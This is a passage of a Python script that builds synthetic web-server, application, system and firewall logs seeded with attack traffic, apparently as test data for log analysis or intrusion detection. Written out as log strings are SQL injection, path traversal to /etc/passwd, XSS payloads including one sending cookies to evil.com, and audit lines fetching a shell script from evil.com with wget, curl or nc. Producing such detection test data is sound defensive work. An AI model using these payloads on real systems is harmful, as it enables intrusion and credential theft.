                    "/api/v1/products?category=1;%20DROP%20TABLE%20products;--",
                ]
            )
            ua = random.choice(MALICIOUS_USER_AGENTS)
            logs.append(
                f'{attacker_ip} - - [{ts}] "GET {url} HTTP/1.1" 500 0 "-" "{ua}"'
            )

    # ATTACK: Path traversal
    for attacker_ip in ATTACKER_IPS:
        for _ in range(40):
            ts = format_clf_timestamp(random_timestamp(base_time))
            url = random.choice(
                [
                    "/../../etc/passwd",
                    "/..%2F..%2F..%2Fetc%2Fpasswd",
                    "/static/../../../etc/shadow",
                    "/download?file=../../../etc/passwd",
                ]
            )
            logs.append(
                f'{attacker_ip} - - [{ts}] "GET {url} HTTP/1.1" 403 199 "-" "{random.choice(MALICIOUS_USER_AGENTS)}"'
            )

    # ATTACK: XSS attempts
    for _ in range(100):
        ts = format_clf_timestamp(random_timestamp(base_time))
        ip = random.choice(ATTACKER_IPS)
        url = random.choice(
            [
                "/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "/comment?text=%3Cimg%20src=x%20onerror=alert%281%29%3E",
                "/api/name=<script>document.location='http://evil.com/?c='+document.cookie</script>",
            ]
        )
        logs.append(
            f'{ip} - - [{ts}] "GET {url} HTTP/1.1" 200 1234 "-" "{random.choice(USER_AGENTS)}"'
        )

    # ATTACK: Directory scanning
    scanner_ip = random.choice(ATTACKER_IPS)
    scan_time = random_timestamp(base_time, 4)
    scan_urls = [
        "/admin",
        "/backup",
        "/.git",
        "/.env",
        "/config.php",
        "/wp-admin",
        "/phpmyadmin",
        "/.htaccess",
        "/server-status",
        "/.svn",
        "/web.config",
        "/robots.txt",
        "/sitemap.xml",
    ]
    for i, url in enumerate(scan_urls * 10):
        ts = format_clf_timestamp(scan_time + timedelta(seconds=i))
        status = random.choice([404, 403, 200])
        logs.append(
            f'{scanner_ip} - - [{ts}] "GET {url} HTTP/1.1" {status} 0 "-" "gobuster/3.1.0"'
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_clf_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS)
        logs.append(
            f'{ip} - - [{ts}] "GET /static/js/app.js HTTP/1.1" 200 {random.randint(1000, 50000)} "-" "{random.choice(USER_AGENTS)}"'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x.split("[")[1][:20] if "[" in x else x)


def generate_nginx_logs() -> List[str]:
    """Generate Nginx access logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_clf_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        url = random.choice(URLS)
        status = random.choice([200, 200, 200, 301, 304, 400, 404, 500])
        size = random.randint(100, 100000)
        ua = random.choice(USER_AGENTS)
        upstream = random.choice(INTERNAL_IPS) if random.random() > 0.3 else "-"

        logs.append(
            f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} {size} "-" "{ua}" "{upstream}"'
        )

    # ATTACK: Same as Apache - SQL injection, XSS, path traversal
    for attacker_ip in ATTACKER_IPS:
        for url in MALICIOUS_URLS:
            ts = format_clf_timestamp(random_timestamp(base_time))
            logs.append(
                f'{attacker_ip} - - [{ts}] "GET {url} HTTP/1.1" {random.choice([400, 403, 500])} 0 "-" "{random.choice(MALICIOUS_USER_AGENTS)}" "-"'
            )

    # ATTACK: Slowloris attempt (many connections)
    slowloris_ip = random.choice(ATTACKER_IPS)
    for _ in range(200):
        ts = format_clf_timestamp(random_timestamp(base_time, 2))
        logs.append(f'{slowloris_ip} - - [{ts}] "GET / HTTP/1.1" 408 0 "-" "-" "-"')

    while len(logs) < LINES_PER_LOG:
        ts = format_clf_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS)
        logs.append(
            f'{ip} - - [{ts}] "GET /api/health HTTP/1.1" 200 15 "-" "kube-probe/1.24" "-"'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x.split("[")[1][:20] if "[" in x else x)


def generate_iis_logs() -> List[str]:
    """Generate IIS W3C logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    logs.append("#Software: Microsoft Internet Information Services 10.0")
    logs.append("#Version: 1.0")
    logs.append(f"#Date: {base_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logs.append(
        "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken"
    )

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iis_timestamp(random_timestamp(base_time))
        server_ip = random.choice(INTERNAL_IPS)
        client_ip = random.choice(EXTERNAL_IPS)
        method = random.choice(["GET", "POST", "PUT"])
        url = random.choice(URLS)
        query = random.choice(
            ["-", f"id={random.randint(1, 1000)}", f"page={random.randint(1, 100)}"]
        )
        status = random.choice([200, 200, 200, 301, 404, 500])
        ua = random.choice(USER_AGENTS).replace(" ", "+")

        logs.append(
            f"{ts} {server_ip} {method} {url} {query} 443 - {client_ip} {ua} - {status} 0 0 {random.randint(10, 5000)}"
        )

    # ATTACK: IIS-specific attacks
    for attacker_ip in ATTACKER_IPS:
        ts = format_iis_timestamp(random_timestamp(base_time))
        # ASP.NET path disclosure
        logs.append(
            f"{ts} 10.0.0.1 GET /trace.axd - 443 - {attacker_ip} Mozilla/5.0 - 200 0 0 50"
        )
        # Web.config access
        logs.append(
            f"{ts} 10.0.0.1 GET /web.config - 443 - {attacker_ip} Mozilla/5.0 - 403 0 0 10"
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_iis_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} 10.0.0.1 GET /healthcheck - 80 - 127.0.0.1 HealthChecker/1.0 - 200 0 0 5"
        )

    return logs


def generate_django_logs() -> List[str]:
    """Generate Django application logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    levels = ["DEBUG", "INFO", "INFO", "INFO", "WARNING", "ERROR"]
    modules = [
        "django.request",
        "django.db.backends",
        "django.security",
        "myapp.views",
        "myapp.models",
    ]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        level = random.choice(levels)
        module = random.choice(modules)

        if module == "django.request":
            ip = random.choice(EXTERNAL_IPS)
            url = random.choice(URLS)
            msg = f'"{random.choice(["GET", "POST"])} {url}" {random.choice([200, 200, 301, 404, 500])}'
        elif module == "django.db.backends":
            msg = f"({random.uniform(0.001, 0.5):.3f}) {random.choice(SQL_QUERIES)}"
        else:
            msg = random.choice(
                [
                    "User logged in successfully",
                    "Permission denied for user",
                    "Cache miss for key user_123",
                    "Task completed in 0.5s",
                ]
            )

        logs.append(f"[{ts}] {level} [{module}] {msg}")

    # ATTACK: Security warnings
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_iso_timestamp(random_timestamp(base_time))
            logs.append(
                f"[{ts}] WARNING [django.security.csrf] Forbidden (CSRF token missing or incorrect): /api/transfer from {attacker_ip}"
            )
            logs.append(
                f"[{ts}] WARNING [django.security] SuspiciousOperation: Invalid HTTP_HOST header: '{attacker_ip}'"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(f'[{ts}] INFO [django.request] "GET /static/css/style.css" 200')

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[1:25])


def generate_flask_logs() -> List[str]:
    """Generate Flask application logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        url = random.choice(URLS)
        status = random.choice([200, 200, 200, 201, 400, 404, 500])

        logs.append(f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} -')

    # ATTACK: Injection attempts
    for attacker_ip in ATTACKER_IPS:
        for url in MALICIOUS_URLS[:5]:
            ts = format_iso_timestamp(random_timestamp(base_time))
            logs.append(f'{attacker_ip} - - [{ts}] "GET {url} HTTP/1.1" 500 -')

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(f'127.0.0.1 - - [{ts}] "GET /health HTTP/1.1" 200 -')

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x.split("[")[1][:24] if "[" in x else x)


def generate_laravel_logs() -> List[str]:
    """Generate Laravel application logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    channels = ["local", "production", "stack"]
    levels = ["DEBUG", "INFO", "INFO", "NOTICE", "WARNING", "ERROR", "CRITICAL"]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        level = random.choice(levels)
        channel = random.choice(channels)

        msg = random.choice(
            [
                f"User {random.choice(USERNAMES)} logged in",
                f"Query executed in {random.uniform(0.01, 1.0):.2f}ms",
                f"Cache hit for key: user_{random.randint(1, 1000)}",
                f"Job processed: SendEmailJob",
                f"Route matched: api/v1/users",
            ]
        )

        logs.append(f"[{ts}] {channel}.{level}: {msg}")

    # ATTACK: SQL injection errors
    for _ in range(150):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        query = random.choice(MALICIOUS_SQL)
        logs.append(
            f"[{ts}] production.ERROR: SQLSTATE[42000]: Syntax error near '{query[:30]}' {{}}"
        )

    # ATTACK: Auth failures
    for attacker_ip in ATTACKER_IPS:
        for _ in range(20):
            ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
            logs.append(
                f"[{ts}] production.WARNING: Login attempt failed for IP: {attacker_ip}"
            )

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        logs.append(
            f"[{ts}] local.DEBUG: Request handled in {random.randint(50, 500)}ms"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[1:20])


def generate_express_logs() -> List[str]:
    """Generate Express.js logs (Morgan format)"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_iso_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        method = random.choice(["GET", "POST", "PUT", "DELETE", "PATCH"])
        url = random.choice(URLS)
        status = random.choice([200, 200, 201, 301, 400, 404, 500])
        time_ms = random.randint(1, 500)
        size = random.randint(100, 50000)

        logs.append(
            f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} {size} - {time_ms} ms'
        )

    # ATTACK: API abuse
    for attacker_ip in ATTACKER_IPS:
        attack_time = random_timestamp(base_time, 3)
        for i in range(100):
            ts = format_iso_timestamp(attack_time + timedelta(seconds=i))
            logs.append(
                f'{attacker_ip} - - [{ts}] "POST /api/login HTTP/1.1" 401 45 - 5 ms'
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_iso_timestamp(random_timestamp(base_time))
        logs.append(f'::1 - - [{ts}] "GET /health HTTP/1.1" 200 2 - 1 ms')

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x.split("[")[1][:24] if "[" in x else x)


def generate_gunicorn_logs() -> List[str]:
    """Generate Gunicorn access logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = format_clf_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS + ATTACKER_IPS[:2])
        method = random.choice(["GET", "POST", "PUT", "DELETE"])

        if ip in ATTACKER_IPS:
            url = random.choice(MALICIOUS_URLS)
            status = random.choice([400, 403, 500])
        else:
            url = random.choice(URLS)
            status = random.choice([200, 200, 200, 201, 301, 404])

        ua = random.choice(
            USER_AGENTS if ip not in ATTACKER_IPS else MALICIOUS_USER_AGENTS
        )

        logs.append(
            f'{ip} - - [{ts}] "{method} {url} HTTP/1.1" {status} {random.randint(100, 50000)} "-" "{ua}"'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x.split("[")[1][:20] if "[" in x else x)


def generate_uvicorn_logs() -> List[str]:
    """Generate Uvicorn (ASGI) logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = format_iso_timestamp(random_timestamp(base_time))
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS + ATTACKER_IPS[:2])
        method = random.choice(["GET", "POST", "PUT", "DELETE"])

        if ip in ATTACKER_IPS:
            url = random.choice(MALICIOUS_URLS)
            status = random.choice([400, 403, 500])
        else:
            url = random.choice(URLS)
            status = random.choice([200, 200, 200, 201, 301, 404])

        logs.append(
            f'INFO:     {ip}:{random.randint(40000, 65000)} - "{method} {url} HTTP/1.1" {status}'
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x)


def generate_rails_logs() -> List[str]:
    """Generate Ruby on Rails logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    controllers = [
        "UsersController",
        "ProductsController",
        "OrdersController",
        "SessionsController",
        "ApiController",
    ]
    actions = ["index", "show", "create", "update", "destroy"]

    for _ in range(LINES_PER_LOG // 3):
        ts = format_iso_timestamp(random_timestamp(base_time))
        controller = random.choice(controllers)
        action = random.choice(actions)
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        url = random.choice(URLS)
        ip = random.choice(EXTERNAL_IPS + INTERNAL_IPS)
        status = random.choice([200, 200, 201, 302, 404, 500])
        duration = random.uniform(10, 500)

        logs.append(f'I, [{ts}]  INFO -- : Started {method} "{url}" for {ip}')
        logs.append(f"I, [{ts}]  INFO -- : Processing by {controller}#{action} as HTML")
        logs.append(
            f"I, [{ts}]  INFO -- : Completed {status} OK in {duration:.0f}ms (Views: {duration * 0.7:.1f}ms | ActiveRecord: {duration * 0.3:.1f}ms)"
        )

    return logs[:LINES_PER_LOG]


# ==================== SYSTEM LOGS ====================


def generate_syslog_logs() -> List[str]:
    """Generate general syslog messages"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    facilities = ["kernel", "user", "daemon", "auth", "syslog", "cron"]

    for _ in range(LINES_PER_LOG):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        facility = random.choice(facilities)
        pid = random.randint(1, 9999)

        msg = random.choice(
            [
                f"[{facility}] Normal operation message",
                f"Service started successfully",
                f"Connection established",
                f"Task completed",
                f"Configuration reloaded",
            ]
        )

        logs.append(f"{ts} {hostname} {facility}[{pid}]: {msg}")

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_systemd_logs() -> List[str]:
    """Generate systemd journal logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    units = [
        "nginx.service",
        "sshd.service",
        "docker.service",
        "postgresql.service",
        "redis.service",
        "cron.service",
    ]
    priorities = ["debug", "info", "notice", "warning", "err", "crit"]

    for _ in range(LINES_PER_LOG):
        ts = format_iso_timestamp(random_timestamp(base_time))
        unit = random.choice(units)
        priority = random.choice(priorities)
        pid = random.randint(1, 9999)

        msg = random.choice(
            [
                f"Started {unit.replace('.service', '')}",
                f"Stopped {unit.replace('.service', '')}",
                f"Main process exited, code=exited, status=0/SUCCESS",
                f"Received SIGHUP, reloading configuration",
                f"Failed to start: unit not found",
            ]
        )

        logs.append(f"{ts} {hostname} systemd[1]: {unit}: {msg}")

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:24])


def generate_kernel_logs() -> List[str]:
    """Generate Linux kernel logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.7)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        uptime = random.uniform(0, 86400)

        msg = random.choice(
            [
                f"[{uptime:.6f}] NET: Registered protocol family {random.randint(1, 40)}",
                f"[{uptime:.6f}] TCP: cubic registered",
                f"[{uptime:.6f}] EXT4-fs (sda1): mounted filesystem with ordered data mode",
                f"[{uptime:.6f}] device eth0 entered promiscuous mode",
                f"[{uptime:.6f}] Memory cgroup out of memory: Kill process {random.randint(1000, 9999)}",
            ]
        )

        logs.append(f"{ts} {hostname} kernel: {msg}")

    # ATTACK: Port scanning detected
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            uptime = random.uniform(0, 86400)
            port = random.randint(1, 65535)
            logs.append(
                f"{ts} {hostname} kernel: [{uptime:.6f}] [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC={attacker_ip} DST=10.0.0.1 LEN=40 TOS=0x00 PROTO=TCP SPT={random.randint(40000, 65000)} DPT={port} WINDOW=1024 RES=0x00 SYN URGP=0"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        uptime = random.uniform(0, 86400)
        logs.append(
            f"{ts} {hostname} kernel: [{uptime:.6f}] audit: type=1400 audit(timestamp): avc:  denied  {{ read }} for  pid={random.randint(1000, 9999)}"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_audit_logs() -> List[str]:
    """Generate Linux audit logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    types = [
        "SYSCALL",
        "EXECVE",
        "CWD",
        "PATH",
        "USER_AUTH",
        "USER_ACCT",
        "CRED_ACQ",
        "USER_START",
        "USER_END",
    ]

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = random_timestamp(base_time)
        audit_ts = f"{int(ts.timestamp())}.{random.randint(100, 999)}:{random.randint(100, 9999)}"
        audit_type = random.choice(types)

        if audit_type == "SYSCALL":
            logs.append(
                f'type={audit_type} msg=audit({audit_ts}): arch=c000003e syscall={random.randint(0, 300)} success=yes exit=0 pid={random.randint(1000, 9999)} uid={random.randint(0, 1000)} auid={random.randint(1000, 2000)} exe="/usr/bin/{random.choice(["ls", "cat", "grep", "find"])}"'
            )
        elif audit_type in ["USER_AUTH", "USER_ACCT"]:
            user = random.choice(USERNAMES)
            ip = random.choice(INTERNAL_IPS)
            res = random.choice(["success", "success", "success", "failed"])
            logs.append(
                f'type={audit_type} msg=audit({audit_ts}): pid={random.randint(1000, 9999)} uid=0 auid={random.randint(1000, 2000)} msg=\'op=PAM:authentication acct="{user}" exe="/usr/sbin/sshd" hostname={ip} addr={ip} res={res}\''
            )
        else:
            logs.append(
                f"type={audit_type} msg=audit({audit_ts}): pid={random.randint(1000, 9999)} uid={random.randint(0, 1000)} auid={random.randint(1000, 2000)} msg='op=start'"
            )

    # ATTACK: Suspicious command execution
    for _ in range(100):
        ts = random_timestamp(base_time)
        audit_ts = f"{int(ts.timestamp())}.{random.randint(100, 999)}:{random.randint(100, 9999)}"
        cmd = random.choice(
            [
                "/usr/bin/wget",
                "/usr/bin/curl",
                "/bin/nc",
                "/usr/bin/nmap",
                "/bin/bash -i",
            ]
        )
        logs.append(
            f'type=EXECVE msg=audit({audit_ts}): argc=3 a0="{cmd}" a1="-c" a2="http://evil.com/shell.sh"'
        )

    # ATTACK: Failed authentications
    for attacker_ip in ATTACKER_IPS:
        for _ in range(30):
            ts = random_timestamp(base_time)
            audit_ts = f"{int(ts.timestamp())}.{random.randint(100, 999)}:{random.randint(100, 9999)}"
            user = random.choice(["root", "admin", "oracle"])
            logs.append(
                f'type=USER_AUTH msg=audit({audit_ts}): pid={random.randint(1000, 9999)} uid=0 auid=4294967295 msg=\'op=PAM:authentication acct="{user}" exe="/usr/sbin/sshd" hostname={attacker_ip} addr={attacker_ip} res=failed\''
            )

    while len(logs) < LINES_PER_LOG:
        ts = random_timestamp(base_time)
        audit_ts = f"{int(ts.timestamp())}.{random.randint(100, 999)}:{random.randint(100, 9999)}"
        logs.append(
            f'type=SERVICE_START msg=audit({audit_ts}): pid=1 uid=0 auid=4294967295 msg=\'unit=nginx comm="systemd" exe="/lib/systemd/systemd" res=success\''
        )

    random.shuffle(logs)
    return logs


def generate_cron_logs() -> List[str]:
    """Generate cron logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    cron_commands = [
        "/usr/bin/php /var/www/artisan schedule:run",
        "/usr/local/bin/backup.sh",
        "/usr/bin/logrotate /etc/logrotate.conf",
        "/usr/bin/certbot renew",
        "run-parts /etc/cron.hourly",
    ]

    for _ in range(LINES_PER_LOG):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        user = random.choice(["root", "www-data", random.choice(USERNAMES)])
        cmd = random.choice(cron_commands)
        pid = random.randint(1000, 9999)

        event = random.choice(
            [
                f"({user}) CMD ({cmd})",
                f"(CRON) INFO (Running @reboot jobs)",
                f"({user}) CMDOUT ({random.choice(['OK', 'Done', 'Completed'])})",
                f"(CRON) INFO (No MTA installed, discarding output)",
            ]
        )

        logs.append(f"{ts} {hostname} CRON[{pid}]: {event}")

    return sorted(logs, key=lambda x: x[:15])


def generate_daemon_logs() -> List[str]:
    """Generate general daemon logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    daemons = ["ntpd", "rsyslogd", "dockerd", "containerd", "kubelet", "etcd"]

    for _ in range(LINES_PER_LOG):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        daemon = random.choice(daemons)
        pid = random.randint(1, 9999)

        msg = random.choice(
            [
                "Service started",
                "Configuration loaded",
                "Listening on port",
                "Health check passed",
                "Peer connected",
                "Sync completed",
            ]
        )

        logs.append(f"{ts} {hostname} {daemon}[{pid}]: {msg}")

    return sorted(logs, key=lambda x: x[:15])


# ==================== FIREWALL LOGS ====================


def generate_iptables_logs() -> List[str]:
    """Generate iptables firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.5)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        src_ip = random.choice(EXTERNAL_IPS)
        dst_ip = random.choice(INTERNAL_IPS)
        proto = random.choice(["TCP", "UDP", "ICMP"])
        action = random.choice(["ACCEPT", "ACCEPT", "DROP"])

        if proto == "TCP":
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([22, 80, 443, 3306, 5432, 8080])
            logs.append(
                f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] iptables {action}: IN=eth0 OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:08:00 SRC={src_ip} DST={dst_ip} LEN={random.randint(40, 1500)} TOS=0x00 PREC=0x00 TTL={random.randint(50, 128)} ID={random.randint(1, 65535)} DF PROTO={proto} SPT={src_port} DPT={dst_port} WINDOW={random.randint(1024, 65535)} RES=0x00 SYN URGP=0"
            )
        elif proto == "UDP":
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([53, 123, 161, 514])
            logs.append(
                f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] iptables {action}: IN=eth0 OUT= SRC={src_ip} DST={dst_ip} LEN={random.randint(40, 1500)} PROTO={proto} SPT={src_port} DPT={dst_port}"
            )
        else:
            logs.append(
                f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] iptables {action}: IN=eth0 OUT= SRC={src_ip} DST={dst_ip} PROTO={proto} TYPE=8 CODE=0"
            )

    # ATTACK: Port scanning
    for attacker_ip in ATTACKER_IPS:
        scan_time = random_timestamp(base_time, 4)
        for i in range(100):
            ts = format_syslog_timestamp(scan_time + timedelta(seconds=i * 0.1))
            dst_ip = random.choice(INTERNAL_IPS)
            dst_port = random.randint(1, 65535)
            logs.append(
                f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] iptables DROP: IN=eth0 OUT= SRC={attacker_ip} DST={dst_ip} LEN=40 PROTO=TCP SPT={random.randint(40000, 65535)} DPT={dst_port} WINDOW=1024 RES=0x00 SYN URGP=0"
            )

    # ATTACK: DDoS traffic
    ddos_ip = random.choice(ATTACKER_IPS)
    ddos_time = random_timestamp(base_time, 2)
    for i in range(200):
        ts = format_syslog_timestamp(ddos_time + timedelta(milliseconds=i * 10))
        logs.append(
            f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] iptables DROP: IN=eth0 OUT= SRC={ddos_ip} DST=10.0.0.1 LEN=40 PROTO=TCP SPT={random.randint(1, 65535)} DPT=80 WINDOW=0 RES=0x00 RST URGP=0"
        )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] iptables ACCEPT: IN=lo OUT= SRC=127.0.0.1 DST=127.0.0.1 LEN=52 PROTO=TCP SPT=3306 DPT={random.randint(40000, 65535)}"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_ufw_logs() -> List[str]:
    """Generate UFW firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(int(LINES_PER_LOG * 0.6)):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        src_ip = random.choice(EXTERNAL_IPS + ATTACKER_IPS[:3])
        dst_ip = random.choice(INTERNAL_IPS)
        action = "ALLOW" if src_ip not in ATTACKER_IPS else "BLOCK"
        proto = random.choice(["TCP", "UDP"])
        dst_port = random.choice([22, 80, 443, 3306, 5432])

        logs.append(
            f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] [UFW {action}] IN=eth0 OUT= MAC=00:00:00:00:00:00:00:00:00:00:00:00:08:00 SRC={src_ip} DST={dst_ip} LEN={random.randint(40, 1500)} TOS=0x00 PREC=0x00 TTL={random.randint(50, 128)} ID={random.randint(1, 65535)} PROTO={proto} SPT={random.randint(1024, 65535)} DPT={dst_port}"
        )

    # ATTACK: Blocked attacks
    for attacker_ip in ATTACKER_IPS:
        for _ in range(50):
            ts = format_syslog_timestamp(random_timestamp(base_time))
            dst_port = random.choice([22, 23, 3389, 445, 139, 1433, 3306])
            logs.append(
                f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] [UFW BLOCK] IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC={attacker_ip} DST=10.0.0.1 LEN=40 TOS=0x00 PREC=0x00 TTL=64 ID={random.randint(1, 65535)} PROTO=TCP SPT={random.randint(40000, 65535)} DPT={dst_port} WINDOW=1024 RES=0x00 SYN URGP=0"
            )

    while len(logs) < LINES_PER_LOG:
        ts = format_syslog_timestamp(random_timestamp(base_time))
        logs.append(
            f"{ts} {hostname} kernel: [{random.uniform(0, 86400):.6f}] [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.1 DST=8.8.8.8 LEN=60 PROTO=UDP SPT={random.randint(1024, 65535)} DPT=53"
        )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_nftables_logs() -> List[str]:
    """Generate nftables firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    for _ in range(LINES_PER_LOG):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        src_ip = random.choice(EXTERNAL_IPS + ATTACKER_IPS[:2])
        dst_ip = random.choice(INTERNAL_IPS)
        action = (
            random.choice(["accept", "drop"]) if src_ip not in ATTACKER_IPS else "drop"
        )
        proto = random.choice(["tcp", "udp", "icmp"])

        if proto in ["tcp", "udp"]:
            logs.append(
                f"{ts} {hostname} kernel: nft_{action} IN=eth0 OUT= SRC={src_ip} DST={dst_ip} PROTO={proto} SPT={random.randint(1024, 65535)} DPT={random.randint(1, 65535)}"
            )
        else:
            logs.append(
                f"{ts} {hostname} kernel: nft_{action} IN=eth0 OUT= SRC={src_ip} DST={dst_ip} PROTO={proto} TYPE=8 CODE=0"
            )

    random.shuffle(logs)
    return sorted(logs, key=lambda x: x[:15])


def generate_firewalld_logs() -> List[str]:
    """Generate firewalld logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)
    hostname = random.choice(HOSTNAMES)

    zones = ["public", "internal", "dmz", "work", "home"]

    for _ in range(LINES_PER_LOG):
        ts = format_syslog_timestamp(random_timestamp(base_time))
        zone = random.choice(zones)

        event = random.choice(
            [
                f"zone '{zone}' added",
                f"service 'ssh' added to zone '{zone}'",
                f"port 8080/tcp added to zone '{zone}'",
                f"Reload complete",
                f"Rich rule added: rule family='ipv4' source address='{random.choice(ATTACKER_IPS)}' reject",
            ]
        )

        logs.append(f"{ts} {hostname} firewalld[{random.randint(1000, 9999)}]: {event}")

    return sorted(logs, key=lambda x: x[:15])


def generate_windows_firewall_logs() -> List[str]:
    """Generate Windows Firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    for _ in range(LINES_PER_LOG):
        ts = random_timestamp(base_time).strftime("%Y-%m-%d %H:%M:%S")
        action = random.choice(["ALLOW", "ALLOW", "DROP", "DROP"])
        proto = random.choice(["TCP", "UDP", "ICMP"])
        src_ip = random.choice(EXTERNAL_IPS + ATTACKER_IPS[:3])
        dst_ip = random.choice(INTERNAL_IPS)

        if proto in ["TCP", "UDP"]:
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443, 3389, 445, 135, 139])
            logs.append(
                f"{ts} {action} {proto} {src_ip} {dst_ip} {src_port} {dst_port} - - - - - - - RECEIVE"
            )
        else:
            logs.append(
                f"{ts} {action} {proto} {src_ip} {dst_ip} - - 8 0 - - - - - RECEIVE"
            )

    return logs


def generate_palo_alto_logs() -> List[str]:
    """Generate Palo Alto firewall logs"""
    logs = []
    base_time = datetime.now() - timedelta(hours=24)

    threat_names = [
